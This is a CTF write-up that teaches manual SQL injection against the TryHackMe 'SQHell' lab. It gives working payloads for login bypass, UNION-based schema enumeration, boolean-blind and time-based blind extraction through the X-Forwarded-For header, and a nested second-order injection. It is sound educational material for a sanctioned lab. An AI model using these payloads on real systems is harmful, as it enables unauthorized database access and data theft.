# :game_die: Guide to manually hunt SQL injection in web apps

---

# SQHell: Manual SQL injection with detailed explanation

Guide to learn and implement the techniques of finding advanced SQL injections in web applications

*AI Generated*

### Why is this write-up worth reading?

In this write-up, my goal is to teach you how to hunt advanced SQL injections in a web application, and we will implement all the techniques in a CTF room, ‘SQHell’ on TryHackMe.
On each injection technique, you will be able to know the expected backend logic that is vulnerable to SQLi & why this injection or payload works.

Room Link: [https://tryhackme.com/room/sqhell](https://tryhackme.com/room/sqhell)

Room Description: There are 5 flags to find but you have to defeat the different SQL injection types.
Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.

### Gettting ready to hunt

- Start the target machine

- Boot your attack box

- Connect to the TryHackMe network

## 1️⃣Login page

You might access the following page of the website when you first visit the IP address in your browser

*Target Website*

Click on the ‘Login’ to access the login page of the website. As the target website is vulnerable to SQL injection so try injecting the SQL payloads and bypass the login page if possible. I have injected the following payloads one by one:

```
ali' or 1=1--
```

*#1) Login page injection*

Failed! Try another payload:

```
ali' or 1=1-- -
```

*#2) Login page injection*

Successfully logged in and obtained the FLAG1

### What is the expected backend logic?

The most common SQL query behind the login functionality, which can be vulnerable to SQLi, can be expected as:

```
SELECT ..... FROM <table-name> WHERE username='$user-input' AND password='$pass-input' LIMIT 1;
```

### Why does the payload work?

The payload that we injected in the above login page, `ali' or 1=1-- -` breaks the SQL query and forms a new one as follows:

```
SELECT ..... FROM <table-name> WHERE username='ali' or 1=1-- -' AND password='$pass-input' LIMIT 1;
```

When the above query is executed, SQL checks whether the username `ali` is `TRUE` or `1=1` is `TRUE` . As `1=1` is a `TRUE` condition, it makes the username check field `TRUE` . However `-- -` at the end of the input is a comment in MySQL DBMS, which makes the rest of the query `' AND password='$pass-input' LIMIT 1;`as a comment and it will not be executed as SQL. Creating a true condition and making the rest of the query a comment allows us to successfully log in to the application.

>

*From the injection attack above, it verifies that the DBMS used by the website is MySQL*

## 2️⃣View the post

*#1) Injection in post-id*

Before injecting the payload, let’s assume the SQL query that can be used by the website to display a post to the user:

```
SELECT .... FROM posts WHERE id=$id;
```

If the above assumption is correct, injecting the following payloads in the `id `parameter should work.

### Identifying the number of columns returned in the query result

`ORDER BY`clause used to sort the result of query, such as: `ORDER BY 2` sorts the result based on second column (if it exist, otherwise gives the error)

- No Error: When the query with `ORDER BY <n>` executes without errors, it implies that there are at least `<n>` columns in the result.

- Error Occurs: When an error occurs (e.g., `ORDER BY 5-- -` results in an error), it means that the original query has fewer than 5 columns. The last successful test (e.g., `ORDER BY 4-- -`) tells that the table has exactly 4 columns.

Let’s try enumeration:

```
2 order by 2-- -
```

*#1) SQLi in ‘id’ parameter*No Error occurred, which shows that the query returns 2 or more columns in the result.

```
2 order by 5-- -
```

*#2) SQLi in ‘id’ parameter*Error: Unknown column ‘5’ in ‘order clause’, this shows that the query returns fewer than 5 columns in the result.

```
2 order by 4-- -
```

*#3) SQLi in ‘id’ parameter*No Error, which means there are 4 or more columns in the query result. As it gives an error in the previous `2 order by 5-- -` , so we can say that there are exactly 4 columns returned in the result

>

No. of columns in main query result is: 4

### List the databases

Using `UNION SELECT` to include the result of injected query along with the original query. Following is the query to list all the databases:

>

Note: Use the post ID hat does not exist (in this case, I am using id=40), because sometimes the website is designed in such a way that it only displays a limited result, which might hide the result of the union query

```
40 union select 1,2,group_concat(schema_name),4 from information_schema.schemata;-- -
```

`group_concat()` combines multiple rows into a single string

`information_schema.schemata` schema table of MySQL database that contains info about the databases in the DBMS

`schema_name` is the column that contains the name of the databases

*#4) SQLi in ‘id’ parameter*

The above injection query results in the two databases: information_schema, sqhell_5

### List the tables in the ‘sqhell_5’ database

Similar to the previous query, this one is used to list the tables in the ‘sqhell_5’ database

```
40 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema='sqhell_5';--
```

*#5) SQLi in ‘id’ parameter*

Tables exist in the ‘sqhell_5’ database: flag,posts,users

### List the columns in ‘flag’ table

```
40 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='flag';-- -
```

*#6) SQLi in ‘id’ parameter*

Columns exist in the ‘flag’ table: flag,id

### Dump the data

```
40 union select 1,2,group_concat(id,"~",flag),4 from flag-- -
```

*#7) SQLi in ‘id’ parameter*

## 3️⃣Username check functionality, at registration form

*Analyzing the username check functionality*

The web application checks for the username in the database. If the username exists in the database, it says: ‘Username already taken’; else ‘Username available’

From above we can analyze if the condition gets `TRUE` it says ‘Username already taken’ & if the condition is `FALSE` it says ‘Username available’:

`ali' or 1=1-- -` — > `TRUE`—> ‘Username alreay taken’
`ali' or 1=2-- -` — > `FALSE`—> ‘Username available’

It allows us to enumerate the database based on Boolean conditions

### Identify the length of the database name

```
ali' or (SELECT length(schema_name) from information_schema.schemata limit 1,1)='8'-- -
```

`limit 1,1` Skips the first 1 row, and returns the next 1 row in the result (which means it extracts the 2nd row only)

*#1) Register form injection*

As the above injection query creates `TRUE` result which means that the length of the second database name is: 8

### Determine the 2nd database name which has length ‘8’

1st character of the database name:

```
ali' or SUBSTRING((SELECT schema_name from information_schema.schemata limit 1,1),1,1)='s'-- -
```

*1st char of database: ‘s’*

As the above injection query creates a`TRUE` result, which shows that the 1st character of the database name is: `s`

Similarly, you can continue the process till the 8th character, which is the last one, because the database name has a length of 8.

Final injection query to verify the name of the database:

```
ali' or (SELECT schema_name from information_schema.schemata limit 1,1)='sqhell_3'-- -
```

*Verify the name of database*

>

It verifies that the name of the database is: sqhell_3

### Identify the Length of the tables in ‘sqhell_3’ database

```
ali' or (SELECT length(table_name) from information_schema.tables where table_schema='sqhell_3' limit 1)='4';-- -
```

*Length of 1st table name*

>

So, length of the 1st table name is: 4

### Determine the 1st table name which has length ‘4’

1st character of the table name:

```
ali' or SUBSTRING((SELECT table_name from information_schema.tables where table_schema='sqhell_3' limit 1),1,1)='f';-- -
```

and, so on…

## Get Huzaifa Malik’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Verify the name of the table

```
ali' or (SELECT table_name from information_schema.tables where table_schema='sqhell_3' limit 1)='flag';-- -
```

*Verify the name of the table*

>

So, from above it verifies that the table name is: flag

### Verify the name of the columns in ‘flag’ table

Name of the 2nd column

```
ali' or (SELECT column_name FROM information_schema.columns WHERE table_name = 'flag' limit 1,1)='flag';-- -
```

*Name of the 2nd column: ‘flag’*

>

The query above verifies that the name of the 2nd column is: flag

### Determine the length of the flag value

Query to determine the length of the flag value:

```
ali' or (SELECT length(flag) FROM flag limit 1)='43';-- -
```

*Length(flag value)*

>

This verifies that the length of the flag value is: 43

### Extracting the flag stored in ‘flag’ column within the ‘flag’ table

The following queries can be used to identify and extract the flag value character by character:

1st character:

```
ali' or SUBSTRING((SELECT flag FROM flag limit 1),1,1)='T';-- -
```

*Identify the 1st character*

>

It verifies that the 1st character of the flag is: T

Similarly, you can perform this process to identify each character of the flag

Here is the final query to verify the flag value you extracted using the process explained above:

```
ali' or (SELECT flag FROM flag limit 1)='FLAG_VALUE';-- -
```

Note: Replace *FLAG_VALUE* with the flag you extracted

*Verify the extracted flag value*

## 4️⃣Injection at ‘id’ parameter of admin user

Path to the vulnerable parameter: `targetIP/user?id=1`

*Vulnerable Parmeter*

As above, the id parameter of the admin user is vulnerable to SQL injection, which can be used to perform database enumeration and extract the stored data.

Expected query, which can be vulnerable to an injection attack:

```
select .... from users where id=1;
```

### Identifying the number of columns returned in query result

```
1 order by 3-- -
```

*1) Identify the no. of columns*

No, an error occurs, so there are 3 or more columns returned in the result.

```
1 order by 4-- -
```

*2) Identify the no. of columns*Error: so there are exactly 3 columns query returns in the result

>

No. of columns that query returns in result is: 3

### Using union to identify the visible columns

```
1 union select 'a','b','c'-- -
```

*1) union injection*

As you can see above, the query executed successfully, but the union output didn’t display

Try changing the ID to a user ID that does not exist:

```
222 union select 'a','b','c'-- -
```

*2) union injection: no posts diaplayed*

The output contains the injected values `a`and `b`, but `c`is not displayed in the output. Also, there is no output displayed in the `Posts` field. This is possible if the application is using a second query after getting the user details by running the first query.

Try another injection query:

```
2222 union select 1,2,3-- -
```

*3) union injection: posts in the output*

You can see that even after injecting the `id` of the user that does not exist, the application still displayed the posts of the first user having `User ID = 1`

If you analyze the query `222 union select 1,2,3-- -` it contains the value `1` which might treated as `User ID`in the second query.

So, from the above expected logic, it is clear that any value we provide at the place of `1` in the union injection will be used in the second query, which is responsible for fetching the posts.

Injecting `1 union select null` in place of `1` :

```
2222 union select '1 union select null',2,3-- -
```

*1) Second query injection*

didn’t work because there is no output in the `Posts` section, this is possible if the second query results in more than one column

Increase the number of null values in union injection to 4:

```
2222 union select '1 union select 1,2,3,4',2,3-- -
```

*2) Second quey injection*Worked, because the application contains the value `2`(which was provided within the UNION injection) in the output of the `Posts` section

The following things are clear from the above injected query:

- The second query has 4 columns in the result

- Only the second column is displayed in the application response

Now, use the following injection query to extract the flag from the database

```
2222 union select '1 union select 1,flag,3,4 from flag',2,3-- -
```

*Flag4 extracted*

## 5️⃣Injection at `X-Forwarded-For` header

Look at the Terms & Conditions of the application:

*Terms & Conditions of the application*

>

We log your IP address for analytics purposes

`X-Forwarded-For` header is used to log the IP address of the client. Capture the request in the BurpSuite or any other web proxy tool to add the `X-Forwarded-For: 127.0.0.1` within the request headers.

*X-Fowarded-For*

Use `sleep()` function to verify the SQL injection

```
X-Forwarded-For: 127.0.0.1' union select sleep(10),null,null;-- -
```

*X-Forwarded-For: 127.0.0.1' union select sleep(10),null,null; — -*

After sending the request, having injected an SQLi payload with the `X-Forwarded-For` header, there was a response delay of 10 seconds, which confirms that this header is vulnerable to Time-based SQLi

*response delay > 10 seconds*

### Identify the length of flag value

```
X-Forwarded-For: 127.0.0.1' UNION SELECT sleep(10),null,null FROM flag where length(flag) = '43' limit 1;-- -
```

*X-Forwarded-For: 127.0.0.1' UNION SELECT sleep(10),null,null FROM flag where length(flag) = ‘43’ limit 1; — -response delay > 10 sec*

>

It verifies that the length of the flag is: 43

### Extracting the Flag

Now, enumerate to extract the flag character by character using the following injection queries:

Verify the 1st character of the Flag:

```
X-Forwarded-For: 127.0.0.1' UNION SELECT sleep(10),null,null FROM flag WHERE substring(flag,1,1) = 'T';-- -
```

Use the following Python script to automate the process of finding the flag:

>

*Note: Before executing this script, keep your BurpSuite running, because this script requires a web proxy tool running on port 8080Flag2 found*

Last query to verify the flag you found:

```
X-Forwarded-For: 127.0.0.1' UNION SELECT sleep(10),null,null FROM flag WHERE flag = 'FLAG_VALUE';-- -
```

*Flag2 foundresponse time > 10 sec*

---
